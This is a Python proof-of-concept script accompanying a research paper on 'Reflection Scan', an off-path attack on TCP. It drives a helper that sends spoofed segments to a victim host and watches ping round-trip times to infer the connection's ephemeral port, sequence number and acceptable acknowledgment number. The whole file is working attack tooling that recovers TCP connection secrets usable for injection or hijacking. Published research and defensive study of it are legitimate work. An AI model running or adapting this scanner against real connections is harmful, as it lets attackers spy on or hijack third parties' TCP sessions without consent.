#!/usr/bin/python
#
# Created by Jan Wrobel <wrr@mixedbit.org>.

"""Proof of concept accompanying 'Reflection Scan: an Off-Path Attack on TCP'.

See README for high level explanation and examples.

The script sets arguments and executes two helper binaries to perform the scan:

1. 'send_query' is executed to send a sequence of spoofed segments to
the victim.

2. 'ping' (from iputils) is executed to determine a query result (by
monitoring changes in round trip time of packets traversing a shared
queue).

"""

import getopt
import random
import re
import subprocess
import sys

class Enum(set):
    """Enumeration type."""

    def __getattr__(self, name):
        if name in self:
            return name
        raise AttributeError

SCAN_MODE = Enum(["PORT", "SQN", "ACK"])

class EndPointAddress:
    """A TCP end point address.

    Attributes:
      ip_address: A string in dotted-decimal notation.
      point: An integer, 0 if port is unknown.
    """

    def __init__(self):
        self.ip_address = ""
        self.port = 0

class Query:
    """Holds parameters that vary between different queries.

    The parameters are passed to the 'send_query' executable.

    Attributes:
        query_params: A list of port numbers, sequence or
            acknowledge numbers the query is scanning.
        ack_number: An acknowledge number to be set in spoofed
            segments or None if default should be used (not None
            only if sequence numbers are scanned).
    """

    def __init__(self, query_params, ack_number):
        self.params = query_params
        self.ack_number = ack_number

    def __str__(self):
        """Textual representation of a query for printing results."""
        query_str = "%d" % (self.params[0])
        if len(self.params) > 1:
            query_str += "-%d" % (self.params[-1])
        if self.ack_number != None:
            query_str += "(%10d)" % (self.ack_number)
        return query_str

class PingResult:
    """Results of a ping command.

    The result is parsed from the ping standard output.
    """

    def __init__(self, ping_output_string):
        match = re.search(r"""(\d+)\ packets\ transmitted,
                          \ (\d+)\ received.*
                          \ (\d+)%\ packet\ loss""",
                          ping_output_string, re.VERBOSE)
        if match is None:
            err_quit("Failed to parse ping output " + ping_output_string)
        self.transmitted = int(match.group(1))
        self.received = int(match.group(2))
        self.loss_percent = int(match.group(3))
        self.lost = self.transmitted - self.received

        self.min_time = 0
        self.avg_time = 0
        self.max_time = 0
        self.mdev_time = 0

        # Doesn't match if all pings were lost.
        match = re.search(
            r"""(\d+\.\d+)/(\d+\.\d+)/(\d+\.\d+)/(\d+\.\d+)\ ms""",
            ping_output_string, re.VERBOSE)
        if match is not None:
            self.min_time = float(match.group(1))
            self.avg_time = float(match.group(2))
            self.max_time = float(match.group(3))
            self.mdev_time = float(match.group(4))

def err_quit(errmsg):
    """Prints an error message and quits."""
    print >> sys.stderr, errmsg
    sys.exit(1)

def execute_send_query_and_ping(ping_command, send_query_command):
    """Executes send_query and ping processes.

    Waits for processes to finish and returns ping results.
    Args:
        ping_command: A list of arguments to the ping process.
        send_query_command: A list of arguments to the send_query process.
    Returns:
        PingResult
    """
    scan_process = subprocess.Popen(send_query_command)
    ping_process = subprocess.Popen(ping_command,
                                    stdout=subprocess.PIPE)
    ping_output = ping_process.communicate()[0]
    ping_result = PingResult(ping_output)
    scan_process.wait()
    return ping_result

def execute_queries(ping_command, send_query_command_common,
                    query_list):
    """Synchronously executes all queries from a list.

    Args:
      send_query_command_common: A list of common arguments to a
          send_query process. Query specific arguments are appended to the
          list for each executed query.
      ping_command: A list of arguments to a ping process.
      query_list: A list of queries to execute.
    Returns:
      A list of ping results.
    """
    results = []
    for query in query_list:
        ack_arg = []
        if query.ack_number != None:
            ack_arg = ['--ack', str(query.ack_number)]
        send_query_command = send_query_command_common + \
            ack_arg + [str(s) for s in query.params]
        ping_result = execute_send_query_and_ping(ping_command,
                                                  send_query_command)
        results.append((query, ping_result))
        print "%s %d %7.3f %7.3f" % (query,
                                     ping_result.lost,
                                     ping_result.mdev_time,
                                     ping_result.avg_time)
    return results

def percentile(pth, input_list):
    """Finds a given percentile from a given input_list.

    Percentile is an element from the input_list below which pth
    percent of values fall.

    Args:
      pth: A percentile [0-1.0].
      input_list: a list of comparable items.
    """
    input_sorted = sorted(input_list)
    index = int(round(pth * len(input_sorted)))
    if index >= len(input_sorted):
        index -= 1
    return input_sorted[index]

def find_reflected(ping_command, send_query_command_common, query_list):
    """Finds a query that reliably induces increase in RTT.

    Each query from the query_list is executed. Queries for which
    average ping RTT was above 90th percentile or for which at least
    one ping probe was lost are rexecuted, other queries are rejected.
    The process is repeated until a single query is left.

    If a RTT/loss ratio spike was caused by reflection of a query, the
    spike should repeatedly recur when the same query is re-executed.
    If RTT/loss ratio spike was a result of some other network
    condition, the spike should eventually disappear when the query is
    re-executed.

    Queries are rexecuted in different order to minimize correlation
    between them (a reflected query can increase RTT of the next
    query).

    Args:
        ping_command: A list of arguments to a ping process.
        send_query_command_common: A list of common arguments to
            a send_query process.
        query_list: Queries to execute.
    Returns:
        A single query for which RTT spike occurs reliably.
    """
    query_result_list = execute_queries(
        ping_command, send_query_command_common, query_list)
    avg_time_list = [ping_result.avg_time for (query, ping_result) in
                     query_result_list]
    avg_time_threshold = percentile(0.9, avg_time_list)
    print "Removing queries for which no ping was lost and " \
        "avg RTT was below " + str(avg_time_threshold)

    query_list_new = [query for (query, ping_result) in query_result_list
                      if ping_result.avg_time >= avg_time_threshold \
                          or ping_result.lost]

    if len(query_list_new) == 1:
        return query_list_new[0]

    print "Retrying remaining queries in different order:"
    random.shuffle(query_list_new)
    return find_reflected(ping_command, send_query_command_common,
                          query_list_new)

def find_not_reflected(ping_command, send_query_command_common, query_list):
    """Finds a query that does not induce increase in RTT.

    As described in the paper, it is much harder to reliably find a
    single query that does not induce a spike than to find a single
    query that induces RTT spike (find_reflected function).

    Each query from the query_list is executed. Queries for which
    average ping RTT was below 0.1th percentile and for which no ping
    probe was lost are rexecuted. Also queries executed before the
    ones selected are rexecuted (this is to make sure minimum is not
    lost when the shared queue is not emptied fast enough). Other
    queries are rejected.

    Queries are rexecuted in different order to minimize correlation
    between them.

    Args:
        ping_command: A list of arguments to a ping process.
        send_query_command_common: A list of common arguments to
            a send_query process.
        query_list: Queries to execute.
    Returns:
        A single query for which RTT spike occurs reliably.
    """
    query_result_list = execute_queries(
        ping_command, send_query_command_common, query_list)
    # Discard queries for which at least one ping was lost.
    query_result_filtered_list = [
        (query, ping_result) for (query, ping_result)
        in query_result_list if ping_result.lost == 0]
    avg_time_list = [ping_result.avg_time for (query, ping_result) in
                     query_result_filtered_list]
    if len(avg_time_list) == 0:
        print "Lost ping for every query. Retrying."
        return find_not_reflected(ping_command, send_query_command_common,
                                  query_list)
    avg_time_threshold = percentile(0.001, avg_time_list)
    print "Removing queries for which ping was lost or " \
        "avg RTT was above " + str(avg_time_threshold)

    query_list_new = []
    previous_added = False
    for i in range(0, len(query_result_list)):
        (query, ping_result) = query_result_list[i]
        if (ping_result.avg_time <= avg_time_threshold and
            not ping_result.lost):
            query_list_new.append(query)
            if i != 0 and not previous_added:
                previous_query = query_result_list[i - 1][0]
                query_list_new.append(previous_query)
            previous_added = True
        else:
            previous_added = False
    if len(query_list_new) == 1:
        return query_list_new[0]

    print "Retrying remaining queries in different order:"
    random.shuffle(query_list_new)
    return find_not_reflected(ping_command, send_query_command_common,
                              query_list_new)

def scan(scan_mode, sequential_sweep, ping_command,
         send_query_command_common, query_list):
    """Executes a scan.

    Args:
        scan_mode: Enum that indicates which TCP secret field is
            searched for.
        sequential_sweep: If set, each query is executed only once, results are
            printed without determining which value is correct.
        ping_command: A list of arguments to a ping process.
        send_query_command_common: A list of common arguments to
            a send_query process.
        query_list: Queries to execute.
    """
    if sequential_sweep:
        execute_queries(ping_command, send_query_command_common, query_list)
    elif scan_mode == SCAN_MODE.PORT or scan_mode == SCAN_MODE.ACK:
        reflected_query = find_reflected(
            ping_command, send_query_command_common, query_list)
        if len(reflected_query.params) != 1:
            print "Searched value is in range: %d-%d.\n" \
                "Executing sequential scan:" \
                % (reflected_query.params[0], reflected_query.params[-1])
            # Create a separate query for each value in a range that
            # was reflected.
            query_list = build_query_list(
                scan_mode,
                reflected_query.params[0],
                reflected_query.params[-1],
                reflected_query.params[1] - reflected_query.params[0],
                1)
            reflected_query = find_reflected(
                ping_command, send_query_command_common, query_list)

        if (scan_mode == SCAN_MODE.PORT):
            print "Ephemeral port: %d" % (reflected_query.params[0])
        else:
            print "Acknowledge number acceptable by Alice: %d.\n"\
                "Alice's SND.NXT is at most "\
                "MAX(66000, largest Bob's window seen) after %d." \
                % (reflected_query.params[0], reflected_query.params[0])
    else:   # scan_mode == SCAN_MODE.SQN:
        not_reflected_query = find_not_reflected(
            ping_command, send_query_command_common, query_list)
        print "Sequence number in Alice's window: %d, acceptable ack: %d.\n" \
            "Bob's SND.NXT is at most Alice's window size before %d."\
            % (not_reflected_query.params[0], not_reflected_query.ack_number,
               not_reflected_query.params[0])

def build_query_list(scan_mode, range_start, range_end, range_step,
                     steps_per_query):
    """Builds a list of all queries to be executed during scanning.

    Args:
        scan_mode: Enum that indicates which TCP secret field is
            searched for (port, sequence or acknowledge number).
        range_start: An integer value that denotes start of a range
            that queries need to cover (the start value is also covered).
        range_end: An integer value that denotes end of a range that
            queries need to cover (the end value is not covered).
        range_step: Distance between values that are probed. If set to
            1, all values between range_start and range_end are
            covered. If set to 2, every second value is probed, etc.
        steps_per_query: How many values should be probed in a single
            query. If set to 1, one value per query is probed, which
            results in a sequential scan.
    Returns:
        A list of Queries.
    """
    values_to_query = range(range_start, range_end, range_step)
    if scan_mode == SCAN_MODE.SQN:
        acks_to_try = [123, 123 + 0xFFFFFFFF / 2]
    else:
        acks_to_try = [None]

    query_list = []
    for value_index in range(0, len(values_to_query), steps_per_query):
        for ack in acks_to_try:
            query = Query(values_to_query[
                    value_index : value_index + steps_per_query], ack)
            query_list.append(query)
    return query_list

def build_ping_command(ping_destination, pings_per_query):
    """Builds a command to start a ping process.

    For each executed query, the command is the same. Number of ping
    probes can be adjusted, other arguments are fixed. See 'man ping'
    for arguments documentation. The arguments below worked well in
    the experimental setup, if they are modified, attention needs to
    be given to few things:

       '-s' needs to be large enough for ping to properly identify
       responses otherwise ping won't report average RTT (in the
       experimental setup 16 was the smallest such value).

       '-S' needs to be large enough not to overflow output buffer
       (should be increased when 'sendto: No buffer space available'
       errors occur).

       In the test setup some combinations of parameters hanged ping
       with no obvious reason (it might have been some system specific
       problem).
    """
    return ['ping', '-i', '0.001', '-W', '3', '-s', '16', '-S', '1000000',
            '-c', str(pings_per_query), ping_destination]

def build_send_query_command(scan_mode, alice_address, bob_address,
                             segment_cnt):
    """Builds a common part of a command to send a query.

    The returned command needs to be parameterized by query specific
    parameters before it is executed.
    """
    query_command = ['./send_query',
                     '--alice_host', alice_address.ip_address,
                     '--bob_host', bob_address.ip_address,
                     '--bob_port', str(bob_address.port),
                     '--segment_cnt', str(segment_cnt),
                     '--scan_mode', scan_mode.lower()
                     ]
    if scan_mode != SCAN_MODE.PORT:
        query_command += ['--alice_port', str(alice_address.port)]
    return query_command

def usage():
    print """
   See README for examples and more detailed explanation of parameters.

   %(prog)s
       --alice_host IP address of the victim (-A).
       [--alice_port] TCP port number of the victim (-a).
       --bob_host IP address of the victim's peer (-B).
       --bob_port TCP port number of the victim's peer (-b).
       --ping_destination IP address of a host to ping (-p).
       --scan_mode 'port' or 'sqn' or 'ack' (-m).
       [--segment_cnt] number of spoofed segments per scanned value (-c).
       [--range_start] port or sequence number to start with (default 0).
       [--range_end] port or sequence number to end with
                     (default 65535 in 'port' mode and 4294967295 in 'sqn' and
                      'ack' modes).
       [--range_step] how many values to skip between scanned values
                      (default 1, set to victim's window size in 'sqn' mode
                       and to max(66000, victim's peer window size) in 'ack'
                       mode).
       [--steps_per_query] number of values scanned per query.
       [--pings_per_query] number of pings sent per query.
       [--sequential_sweep] each query is sent only once, does not try to
                            determine which scanned value is correct,
                            just prints results.
       """ % {'prog': sys.argv[0]}
    sys.exit(1)

def main():
    alice_address = EndPointAddress()
    bob_address = EndPointAddress()
    ping_destination = ""
    segment_cnt = 50
    scan_mode = None
    sequential_sweep = False
    range_start = 0
    range_end = -1
    range_step = 1
    steps_per_query = 1
    pings_per_query = 3

    try:
        optlist, _ = getopt.gnu_getopt(sys.argv[1:],
                                       "A:a:B:b:p:c:m:t:s:h",
                                       ["alice_host=",
                                        "alice_port=",
                                        "bob_host=",
                                        "bob_port=",
                                        "ping_destination=",
                                        "segment_cnt=",
                                        "scan_mode=",
                                        "sqn=",
                                        "sequential_sweep",
                                        "range_start=",
                                        "range_end=",
                                        "range_step=",
                                        "steps_per_query=",
                                        "pings_per_query="])
    except getopt.GetoptError, ex:
        print "Arguments parsing error: ", ex,
        usage()

    for opt, arg in optlist:
        if opt == "-h":
            usage()
        elif opt in ("-A", "--alice_host"):
            alice_address.ip_address = arg
        elif opt in ("-a", "--alice_port"):
            alice_address.port = int(arg)
        elif opt in ("-B", "--bob_host"):
            bob_address.ip_address = arg
        elif opt in ("-b", "--bob_port"):
            bob_address.port = int(arg)
        elif opt in ("-p", "--ping_destination"):
            ping_destination = arg
        elif opt in ("-c", "--segment_cnt"):
            segment_cnt = int(arg)
        elif opt in ("-m", "--scan_mode"):
            upcase_arg = arg.upper()
            if upcase_arg in SCAN_MODE:
                scan_mode = upcase_arg
            else:
                err_quit("%s is not supported scan mode." % (arg))
        elif opt in ("--sequential_sweep"):
            sequential_sweep = True
        elif opt in ("--range_start"):
            range_start = int(arg)
        elif opt in ("--range_end"):
            range_end = int(arg)
        elif opt in ("--range_step"):
            range_step = int(arg)
        elif opt in ("--steps_per_query"):
            steps_per_query = int(arg)
        elif opt in ("--pings_per_query"):
            pings_per_query = int(arg)
        else:
            assert False, "unhandled option"

    if alice_address.ip_address == "":
        err_quit("--alice_host is missing")
    if alice_address.port == 0 and scan_mode != SCAN_MODE.PORT:
        err_quit("--alice_port is missing")
    if bob_address.ip_address == "":
        err_quit("--bob_host is missing")
    if bob_address.port == 0:
        err_quit("--bob_port is missing")
    if ping_destination == "":
        err_quit("--ping_destination is missing")
    if scan_mode == None:
        err_quit("--scan_mode is missing")

    if range_end == -1:
        if scan_mode == SCAN_MODE.PORT:
            range_end = 0xFFFF
        else:
            range_end = 0xFFFFFFFF

    if range_start >= range_end:
        err_quit("Incorrect range to scan: %d %d" % (range_start, range_end))

    scan(scan_mode,
         sequential_sweep,
         build_ping_command(
            ping_destination, pings_per_query),
         build_send_query_command(
            scan_mode, alice_address, bob_address, segment_cnt),
         build_query_list(
            scan_mode, range_start, range_end, range_step, steps_per_query),
         )

if __name__ == "__main__":
    main()
